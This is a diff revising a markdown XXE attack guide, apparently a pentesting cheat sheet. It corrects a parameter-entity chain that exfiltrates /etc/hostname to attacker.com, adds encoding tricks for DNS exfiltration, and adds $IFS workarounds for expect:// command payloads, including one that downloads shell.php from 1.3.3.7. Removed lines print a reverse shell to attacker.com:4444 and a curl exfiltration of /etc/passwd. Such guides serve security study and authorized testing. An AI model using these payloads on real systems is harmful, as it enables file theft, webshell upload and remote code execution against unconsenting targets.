@@ -93,13 +93,13 @@ And they are referenced with `%filename;` instead of `&name;`:
 Why do they matter? Because parameter entities can define other entities. This creates a chain where one entity sets up another entity which sets up another. Here is a simplified example of how chaining works:
 
 ```xml
-<!ENTITY % step1 "file:///etc/hostname">
+<!ENTITY % step1 SYSTEM "file:///etc/hostname">
 <!ENTITY % step2 "<!ENTITY &#x25; step3 SYSTEM 'http://attacker.com/?data=%step1;'>">
 %step2;
 %step3;
 ```
 
-What happens here: `%step1` reads the hostname file, `%step2` creates a new entity that embeds the hostname into a URL, and `%step3` makes the parser visit that URL — sending the stolen data to the attacker. Don't worry about the `&#x25;` syntax for now, it is explained in detail in the [OOB section](#understanding-the-escape-characters).
+What happens here: `%step1` is an external entity (the `SYSTEM` keyword makes it fetch the file instead of treating the value as a literal string), `%step2` creates a new entity that embeds the hostname into a URL, and `%step3` makes the parser visit that URL — sending the stolen data to the attacker. Don't worry about the `&#x25;` syntax for now, it is explained in detail in the [OOB section](#understanding-the-escape-characters).
 
 This chaining ability is what makes advanced XXE techniques (like blind exfiltration and OOB attacks) possible.
 
@@ -130,7 +130,7 @@ To understand the difference between a harmless entity and a dangerous one, comp
 **Internal entity (harmless):**
 
 ```XML
-<!--?xml version="1.0" ?-->
+<?xml version="1.0" ?>
 <!DOCTYPE replace [<!ENTITY example "Doe"> ]>
  <userInfo>
   <firstName>John</firstName>
@@ -143,7 +143,7 @@ Here the attacker is defining the entity "example", assigning the value "Doe" to
 **External entity (dangerous):**
 
 ```XML
-<!--?xml version="1.0" ?-->
+<?xml version="1.0" ?>
 <!DOCTYPE replace [<!ENTITY example SYSTEM "file:///etc/passwd"> ]>
  <userInfo>
   <firstName>John</firstName>
@@ -1367,7 +1367,9 @@ Monitor DNS queries on `attacker.com` to capture data. Tools like `dnsdumpster` 
 %exfiltrate;
 ```
 
-Keep in mind that DNS has strict length limits: each label (subdomain component) can be at most 63 characters and the full domain name cannot exceed 253 characters. This means DNS exfiltration works best for short values (hostname, single config values, usernames) but not for large files. For longer content you would need to split the data into chunks and send multiple DNS queries, or combine this with other techniques.
+There are two important limitations to keep in mind. First, DNS has strict length limits: each label (subdomain component) can be at most 63 characters and the full domain name cannot exceed 253 characters. Second — and this is easy to overlook — DNS labels only accept alphanumeric characters (a-z, 0-9) and hyphens. Characters like `:`, `/`, newlines and spaces will break the query. Since files like `/etc/passwd` are full of these characters, the payloads above will only work as-is for files with very simple content (like `/etc/hostname` which is typically a single word).
+
+To exfiltrate anything meaningful we need to encode the data before embedding it in the subdomain. Base32 is the safest option because its output only contains A-Z and 2-7 — all valid DNS characters. Base64 works in some contexts but its output includes `+`, `/` and `=` which are also invalid in labels. In PHP environments we can combine `php://filter/convert.base64-encode` with the exfiltration payload to get clean ASCII before it hits the DNS query. For files longer than 63 characters, split the encoded data into chunks across multiple labels or multiple queries.
 
 ## PHP Wrappers
 
@@ -1394,10 +1396,23 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 More examples:
 
 ```xml
-<!ENTITY xxe SYSTEM "expect://cat /etc/passwd">
-<!ENTITY xxe SYSTEM "expect://bash -i >& /dev/tcp/attacker.com/4444 0>&1">
-<!ENTITY xxe SYSTEM "expect://curl http://attacker.com/?data=$(cat /etc/passwd | base64)">
+<!ENTITY xxe SYSTEM "expect://id">
+<!ENTITY xxe SYSTEM "expect://whoami">
 ```
+
+**⚠️ Character restrictions in expect:// URIs.** There is a catch when running commands with arguments: PHP's XML parser treats the `expect://` URI literally and rejects it if it contains spaces, `>`, `&` or other special characters. A payload like `expect://cat /etc/passwd` will fail with an "Invalid URI" error. URL encoding (`%20`, `+`) does not help — the parser does not decode it. XML character references (`&#x20;`) do not work either.
+
+The workaround is to replace spaces with `$IFS` — the shell Internal Field Separator variable. When the next argument starts with letters, wrap it in single quotes so the shell does not try to read it as part of the variable name:
+
+```xml
+<!-- cat /etc/passwd → replace spaces with $IFS -->
+<!ENTITY xxe SYSTEM "expect://cat$IFS/etc/passwd">
+
+<!-- curl -O http://1.3.3.7/shell.php → $IFS + quotes for args -->
+<!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'1.3.3.7/shell.php'">
+```
+
+For complex commands like reverse shells it is easier to use `expect://` to download a script first and then execute it in a second request, rather than cramming the whole command into a single URI.
 
 `expect://` requires the PHP `expect` extension which as mentioned is rarely present in production environments.
 
@@ -1498,7 +1513,7 @@ RMI example:
 |"Unknown protocol: X"             |Typo in protocol name           |Use valid protocols: `file://`, `http://`, `ftp://`|
 |No entity expansion in output     |Entity expansion disabled       |Try XInclude or wrapper techniques                 |
 |No callback received from OOB     |Firewall blocking outbound      |Use DNS-based OOB; test from DMZ if possible       |
-|File contents show only first line|Binary/special characters       |Use CDATA or error-based exfiltration              |
+|File contents show only first line|Binary/special characters       |Use error-based or OOB exfiltration; use php://filter for encoding|
 |DOCTYPE not allowed error         |DOCTYPE explicitly disabled     |Use XInclude or file upload techniques             |
 |Entity limit exceeded             |Billion Laughs protection active|Use single entity; avoid recursive expansion       |
 |403/500 on OOB callback           |WAF blocking the request        |Obfuscate URL; use different protocols             |
@@ -1554,7 +1569,7 @@ unzip interactsh-client_1.0.0_linux_amd64.zip
 
 ## OWASP
 
-- [A05:2021 – XML External Entity (XXE)](https://owasp.org/Top10/A05_2021-XML_External_Entity_XXE/)
+- [A05:2021 – Security Misconfiguration (includes XXE)](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
 - https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
 - https://owasp.org/www-community/attacks/XML_External_Entity_(XXE)_Processing
 
@@ -1574,5 +1589,3 @@ unzip interactsh-client_1.0.0_linux_amd64.zip
 
 - **XML External Entity (XXE) Processing** - NIST Guidelines
 - **DTD Security Considerations** - W3C XML Specifications
-
------
